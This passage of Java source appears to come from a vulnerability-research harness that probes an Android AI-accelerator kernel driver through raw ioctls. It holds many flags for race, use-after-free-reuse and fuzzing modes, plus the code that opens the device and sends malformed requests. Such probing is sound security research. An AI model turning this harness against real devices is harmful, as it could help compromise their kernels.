            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-wrapper-data-control".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataControl = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-wrapper-data-output44".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataOutput44 = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-wrapper-data-output44-control".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataOutput44Control = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-wrapper-data-code5".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataCode5 = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-wrapper-data-code5-control".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataCode5Control = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-iova".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsIova = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-iova-control".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-wait-iova".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsWaitIova = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-word-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsWordMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-word-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsWordMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-size-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsSizeMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-size-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsSizeMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-priority-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsPriorityMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-priority-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsPriorityMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-buffer-count-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsBufferCountMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-buffer-count-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsBufferCountMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-port-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsPortMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-port-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsPortMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-format-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsFormatMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-format-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsFormatMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-plane-count-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsPlaneCountMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-plane-count-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsPlaneCountMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-height-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsHeightMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-height-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsHeightMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-operand-id-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsOperandIdMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-operand-id-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsOperandIdMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-op-shape-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsOpShapeMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-op-shape-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsOpShapeMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-opcode-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsOpcodeMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-opcode-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsOpcodeMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-descriptor-layout-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsDescriptorLayoutMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-descriptor-layout-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsDescriptorLayoutMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-output-first-opcode-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsOutputFirstOpcodeMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-output-first-opcode-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsOutputFirstOpcodeMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-codebuf-size-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsCodebufSizeMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-code5-no-settings-codebuf-size-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetCode5NoSettingsCodebufSizeMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-wait-iova".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsWaitIova = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-wait-iova-control".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsWaitIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-opcode-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsOpcodeMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-opcode-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsOpcodeMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-operand-id-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsOperandIdMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-operand-id-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsOperandIdMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-operand-offset-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsOperandOffsetMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-operand-offset-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsOperandOffsetMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-op-shape-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsOpShapeMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-op-shape-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsOpShapeMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-code-size-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsCodeSizeMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-code-size-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsCodeSizeMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-code-size-range-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsCodeSizeRangeMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-code-size-range-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsCodeSizeRangeMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-code-size-clean-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsCodeSizeCleanMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-code-size-clean-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsCodeSizeCleanMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-output-shape-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsOutputShapeMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-output-shape-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsOutputShapeMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-data-desc-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsDataDescMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-data-desc-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsDataDescMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-data-entry-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsDataEntryMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-data-entry-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsDataEntryMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-data-target-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsDataTargetMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-data-target-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsDataTargetMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-data-payload-matrix-iova".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsDataPayloadMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-data-payload-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsDataPayloadMatrixIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-descriptor-plane-fuzz-iova".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsDescriptorPlaneFuzzIova = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-descriptor-plane-fuzz-iova-control".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsDescriptorPlaneFuzzIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-cmd-copyback-diff-iova".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsCmdCopybackDiffIova = true;
            } else if ("--run-cmd-vpu-xrp-target-settings5-no-settings-cmd-copyback-diff-iova-control".equals(arg)) {
                runCmdVpuXrpTargetSettings5NoSettingsCmdCopybackDiffIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-close-race-iova".equals(arg)) {
                runCmdVpuXrpCloseRaceIova = true;
            } else if ("--run-cmd-vpu-xrp-close-race-delay-matrix-iova".equals(arg)) {
                runCmdVpuXrpCloseRaceDelayMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-mem-free-race-iova".equals(arg)) {
                runCmdVpuXrpMemFreeRaceIova = true;
            } else if ("--run-cmd-vpu-xrp-mem-free-race-completed-iova".equals(arg)) {
                runCmdVpuXrpMemFreeRaceCompletedIova = true;
            } else if ("--run-cmd-vpu-xrp-mem-free-race-completed-reuse-iova".equals(arg)) {
                runCmdVpuXrpMemFreeRaceCompletedReuseIova = true;
            } else if ("--run-cmd-vpu-xrp-mem-free-race-completed-gap-reuse-iova".equals(arg)) {
                runCmdVpuXrpMemFreeRaceCompletedGapReuseIova = true;
            } else if ("--run-cmd-vpu-xrp-dev-ctrl-race-iova".equals(arg)) {
                runCmdVpuXrpDevCtrlRaceIova = true;
            } else if ("--run-cmd-vpu-xrp-dev-ctrl-matrix-iova".equals(arg)) {
                runCmdVpuXrpDevCtrlMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-two-command-shared-iova".equals(arg)) {
                runCmdVpuXrpTwoCommandSharedIova = true;
            } else if ("--run-cmd-vpu-xrp-completed-latency-matrix-iova".equals(arg)) {
                runCmdVpuXrpCompletedLatencyMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-completion-poll-iova".equals(arg)) {
                runCmdVpuXrpCompletionPollIova = true;
            } else if ("--apusys-iova-reuse-profiler".equals(arg)) {
                apusysIovaReuseProfiler = true;
            } else if ("--apusys-iova-gap-profiler".equals(arg)) {
                apusysIovaGapProfiler = true;
            } else if ("--apusys-iova-gap-control-profiler".equals(arg)) {
                apusysIovaGapControlProfiler = true;
            } else if ("--apusys-iova-gap-pair-selection-profiler".equals(arg)) {
                apusysIovaGapPairSelectionProfiler = true;
            } else if ("--apusys-iova-gap-pressure-profiler".equals(arg)) {
                apusysIovaGapPressureProfiler = true;
            } else if ("--apusys-iova-gap-source-profiler".equals(arg)) {
                apusysIovaGapSourceProfiler = true;
            } else if ("--apusys-iova-gap-free-neighborhood-profiler".equals(arg)) {
                apusysIovaGapFreeNeighborhoodProfiler = true;
            } else if ("--apusys-iova-gap-lower2-focus-profiler".equals(arg)) {
                apusysIovaGapLower2FocusProfiler = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-wrapper-data-preload-slot".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataPreloadSlot = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-wrapper-data-preload-slot-control".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataPreloadSlotControl = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-flags-matrix".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescFlagsMatrix = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-flags-matrix-control".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescFlagsMatrixControl = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-operand-offset-matrix".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescOperandOffsetMatrix = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-operand-offset-matrix-control".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescOperandOffsetMatrixControl = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-output-ready".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsOutputReady = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-output-ready-control".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsOutputReadyControl = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-output-first".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsOutputFirst = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-output-first-control".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsOutputFirstControl = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc5".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDesc5 = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc5-control".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaLibvpuDesc5Control = true;
            } else if ("--run-cmd-vpu-xrp-op-matrix-iova".equals(arg)) {
                runCmdVpuXrpOpMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-op-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpOpMatrixIovaControl = true;
            } else if (arg.startsWith("--run-cmd-vpu-xrp-op-case-iova=")) {
                String label = arg.substring(
                    "--run-cmd-vpu-xrp-op-case-iova=".length());
                runCmdVpuXrpOpCaseIova = requireXrpOpSpec(label);
            } else if (arg.startsWith("--run-cmd-vpu-xrp-op-case-iova-control=")) {
                String label = arg.substring(
                    "--run-cmd-vpu-xrp-op-case-iova-control=".length());
                runCmdVpuXrpOpCaseIovaControl = requireXrpOpSpec(label);
            } else if (arg.startsWith("--ucmd-key=")) {
                ucmdKey = arg.substring("--ucmd-key=".length());
                validateUcmdKey(ucmdKey);
            } else if (arg.startsWith("--ucmd-key-dump=")) {
                ucmdKeyDump = arg.substring("--ucmd-key-dump=".length());
                validateUcmdKey(ucmdKeyDump);
            } else {
                throw new IllegalArgumentException("unknown option: " + arg);
            }
        }

        System.out.println("[*] === APUSYS ioctl probe ===");
        if (memNegative || devCtrl || memDmabuf || memIon || fdScan
                || ucmdNegative || hardwareBuffer || ucmdHardwareBuffer
                || runCmdHardwareBuffer || runCmdInvalidSc || runCmdVpuGuard
                || runCmdVpuExec || runCmdVpuIova || runCmdVpuIovaControl
                || runCmdVpuXrpIova || runCmdVpuXrpIovaControl
                || runCmdVpuXrpSplitIova || runCmdVpuXrpSplitIovaControl
                || runCmdVpuXrpAnnVersionIova || runCmdVpuXrpAnnVersionIovaControl
                || runCmdVpuXrpAnnVersionWrapperZeroDataIova
                || runCmdVpuXrpAnnVersionWrapperZeroDataIovaControl
                || runCmdVpuXrpAnnVersionWrapperZeroDataWaitIova
                || runCmdVpuXrpInternalAnnVersionIova
                || runCmdVpuXrpInternalAnnVersionIovaControl
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDesc
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescControl
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlags
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsControl
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsSettings68
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsSettings68Control
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperData
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataControl
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataOutput44
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataOutput44Control
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataCode5
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataCode5Control
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataPreloadSlot
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataPreloadSlotControl
                || runCmdVpuXrpTargetCode5NoSettingsIova
                || runCmdVpuXrpTargetCode5NoSettingsIovaControl
                || runCmdVpuXrpTargetCode5NoSettingsWaitIova
                || runCmdVpuXrpTargetCode5NoSettingsWordMatrixIova
                || runCmdVpuXrpTargetCode5NoSettingsWordMatrixIovaControl
                || runCmdVpuXrpTargetCode5NoSettingsSizeMatrixIova
                || runCmdVpuXrpTargetCode5NoSettingsSizeMatrixIovaControl
                || runCmdVpuXrpTargetCode5NoSettingsPriorityMatrixIova
                || runCmdVpuXrpTargetCode5NoSettingsPriorityMatrixIovaControl
                || runCmdVpuXrpTargetCode5NoSettingsBufferCountMatrixIova
                || runCmdVpuXrpTargetCode5NoSettingsBufferCountMatrixIovaControl
                || runCmdVpuXrpTargetCode5NoSettingsPortMatrixIova
                || runCmdVpuXrpTargetCode5NoSettingsPortMatrixIovaControl
                || runCmdVpuXrpTargetCode5NoSettingsFormatMatrixIova
                || runCmdVpuXrpTargetCode5NoSettingsFormatMatrixIovaControl
                || runCmdVpuXrpTargetCode5NoSettingsPlaneCountMatrixIova
                || runCmdVpuXrpTargetCode5NoSettingsPlaneCountMatrixIovaControl
                || runCmdVpuXrpTargetCode5NoSettingsHeightMatrixIova
                || runCmdVpuXrpTargetCode5NoSettingsHeightMatrixIovaControl
                || runCmdVpuXrpTargetCode5NoSettingsOperandIdMatrixIova
                || runCmdVpuXrpTargetCode5NoSettingsOperandIdMatrixIovaControl
                || runCmdVpuXrpTargetCode5NoSettingsOpShapeMatrixIova
                || runCmdVpuXrpTargetCode5NoSettingsOpShapeMatrixIovaControl
                || runCmdVpuXrpTargetCode5NoSettingsOpcodeMatrixIova
                || runCmdVpuXrpTargetCode5NoSettingsOpcodeMatrixIovaControl
                || runCmdVpuXrpTargetCode5NoSettingsDescriptorLayoutMatrixIova
                || runCmdVpuXrpTargetCode5NoSettingsDescriptorLayoutMatrixIovaControl
                || runCmdVpuXrpTargetCode5NoSettingsOutputFirstOpcodeMatrixIova
                || runCmdVpuXrpTargetCode5NoSettingsOutputFirstOpcodeMatrixIovaControl
                || runCmdVpuXrpTargetCode5NoSettingsCodebufSizeMatrixIova
                || runCmdVpuXrpTargetCode5NoSettingsCodebufSizeMatrixIovaControl
                || runCmdVpuXrpTargetSettings5NoSettingsWaitIova
                || runCmdVpuXrpTargetSettings5NoSettingsWaitIovaControl
                || runCmdVpuXrpTargetSettings5NoSettingsOpcodeMatrixIova
                || runCmdVpuXrpTargetSettings5NoSettingsOpcodeMatrixIovaControl
                || runCmdVpuXrpTargetSettings5NoSettingsOperandIdMatrixIova
                || runCmdVpuXrpTargetSettings5NoSettingsOperandIdMatrixIovaControl
                || runCmdVpuXrpTargetSettings5NoSettingsOperandOffsetMatrixIova
                || runCmdVpuXrpTargetSettings5NoSettingsOperandOffsetMatrixIovaControl
                || runCmdVpuXrpTargetSettings5NoSettingsOpShapeMatrixIova
                || runCmdVpuXrpTargetSettings5NoSettingsOpShapeMatrixIovaControl
                || runCmdVpuXrpTargetSettings5NoSettingsCodeSizeMatrixIova
                || runCmdVpuXrpTargetSettings5NoSettingsCodeSizeMatrixIovaControl
                || runCmdVpuXrpTargetSettings5NoSettingsCodeSizeRangeMatrixIova
                || runCmdVpuXrpTargetSettings5NoSettingsCodeSizeRangeMatrixIovaControl
                || runCmdVpuXrpTargetSettings5NoSettingsCodeSizeCleanMatrixIova
                || runCmdVpuXrpTargetSettings5NoSettingsCodeSizeCleanMatrixIovaControl
                || runCmdVpuXrpTargetSettings5NoSettingsOutputShapeMatrixIova
                || runCmdVpuXrpTargetSettings5NoSettingsOutputShapeMatrixIovaControl
                || runCmdVpuXrpTargetSettings5NoSettingsDataDescMatrixIova
                || runCmdVpuXrpTargetSettings5NoSettingsDataDescMatrixIovaControl
                || runCmdVpuXrpTargetSettings5NoSettingsDataEntryMatrixIova
                || runCmdVpuXrpTargetSettings5NoSettingsDataEntryMatrixIovaControl
                || runCmdVpuXrpTargetSettings5NoSettingsDataTargetMatrixIova
                || runCmdVpuXrpTargetSettings5NoSettingsDataTargetMatrixIovaControl
                || runCmdVpuXrpTargetSettings5NoSettingsDataPayloadMatrixIova
                || runCmdVpuXrpTargetSettings5NoSettingsDataPayloadMatrixIovaControl
                || runCmdVpuXrpTargetSettings5NoSettingsDescriptorPlaneFuzzIova
                || runCmdVpuXrpTargetSettings5NoSettingsDescriptorPlaneFuzzIovaControl
                || runCmdVpuXrpTargetSettings5NoSettingsCmdCopybackDiffIova
                || runCmdVpuXrpTargetSettings5NoSettingsCmdCopybackDiffIovaControl
                || runCmdVpuXrpCloseRaceIova
                || runCmdVpuXrpCloseRaceDelayMatrixIova
                || runCmdVpuXrpMemFreeRaceIova
                || runCmdVpuXrpMemFreeRaceCompletedIova
                || runCmdVpuXrpMemFreeRaceCompletedReuseIova
                || runCmdVpuXrpMemFreeRaceCompletedGapReuseIova
                || runCmdVpuXrpDevCtrlRaceIova
                || runCmdVpuXrpDevCtrlMatrixIova
                || runCmdVpuXrpTwoCommandSharedIova
                || runCmdVpuXrpCompletedLatencyMatrixIova
                || runCmdVpuXrpCompletionPollIova
                || apusysIovaReuseProfiler
                || apusysIovaGapProfiler
                || apusysIovaGapControlProfiler
                || apusysIovaGapPairSelectionProfiler
                || apusysIovaGapPressureProfiler
                || apusysIovaGapSourceProfiler
                || apusysIovaGapFreeNeighborhoodProfiler
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescFlagsMatrix
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescFlagsMatrixControl
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescOperandOffsetMatrix
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescOperandOffsetMatrixControl
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsOutputReady
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsOutputReadyControl
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsOutputFirst
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsOutputFirstControl
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDesc5
                || runCmdVpuXrpInternalAnnVersionIovaLibvpuDesc5Control
                || runCmdVpuXrpOpMatrixIova || runCmdVpuXrpOpMatrixIovaControl
                || runCmdVpuXrpOpCaseIova != null
                || runCmdVpuXrpOpCaseIovaControl != null
                || ucmdKey != null || ucmdKeyDump != null) {
            System.out.println("[*] Mode: optional checks enabled;"
                + " no secure alloc/free; some modes submit controlled"
                + " provider probes\n");
        } else {
            System.out.println("[*] Mode: reject/query paths only;"
                + " no memory create/free, no dev-ctrl, no valid cmdbuf\n");
        }

        DrmTrigger.initSyscall();

        int fd = -1;
        try {
            fd = DrmTrigger.openDev(APUSYS_DEV);
            System.out.println("[+] Opened " + APUSYS_DEV + " fd=" + fd);

            ioctlAndPrint(fd, "unknown", APUSYS_CMD_UNKNOWN, 0);
            ioctlAndPrint(fd, "disabled_0c", APUSYS_CMD_DISABLED_0C, 0);
            ioctlAndPrint(fd, "disabled_0d", APUSYS_CMD_DISABLED_0D, 0);

            long handshake = DrmTrigger.sScratchBuf + OFF_HANDSHAKE;
            DrmTrigger.zeroMem(handshake, 0x28);
            ioctlAndPrint(fd, "handshake_reject", APUSYS_CMD_HANDSHAKE, handshake);

            long runCmd = DrmTrigger.sScratchBuf + OFF_RUN_CMD;
            DrmTrigger.zeroMem(runCmd, 0x18);
            DrmTrigger.unsafePutInt(runCmd + 0x0c, 1);
            ioctlAndPrint(fd, "run_async_reject", APUSYS_CMD_RUN_ASYNC, runCmd);
            ioctlAndPrint(fd, "run_sync_reject", APUSYS_CMD_RUN_SYNC, runCmd);

            long ucmd = DrmTrigger.sScratchBuf + OFF_UCMD;
            DrmTrigger.zeroMem(ucmd, 0x14);
            DrmTrigger.unsafePutInt(ucmd + 0x0c, 1);
            ioctlAndPrint(fd, "ucmd_reject", APUSYS_CMD_UCMD, ucmd);

            if (query) {
                DrmTrigger.zeroMem(handshake, 0x28);
                DrmTrigger.unsafePutInt(handshake + 0x0c, 1);
                long ret = ioctlAndPrint(fd, "handshake_query", APUSYS_CMD_HANDSHAKE, handshake);
                if (ret >= 0) {
                    dumpU32Words("handshake", handshake, 0x28);
                }
            }

            if (memNegative) {
                runMemNegative(fd);
            }

            if (devCtrl) {
                runDevCtrlProbe(fd);
            }

            if (memDmabuf) {
                runMemDmabuf(fd);
            }

            if (memIon) {
                runMemIon(fd);
            }

            if (fdScan) {
                runFdScan(fd);
            }

            if (ucmdNegative) {
                runUcmdNegative(fd);
            }

            if (hardwareBuffer) {
                runHardwareBufferProbe(fd);
            }

            if (ucmdHardwareBuffer) {
                runUcmdHardwareBufferProbe(fd);
            }

            if (runCmdHardwareBuffer) {
                runRunCmdHardwareBufferProbe(fd);
            }

            if (runCmdInvalidSc) {
                runRunCmdInvalidScHardwareBufferProbe(fd);
            }

            if (runCmdVpuGuard) {
                runRunCmdVpuGuardHardwareBufferProbe(fd);
            }

            if (runCmdVpuExec) {
                runRunCmdVpuExecHardwareBufferProbe(fd);
            }

            if (runCmdVpuIova) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, true, false, false,
                    XRP_OP_NONE);
            }

            if (runCmdVpuIovaControl) {
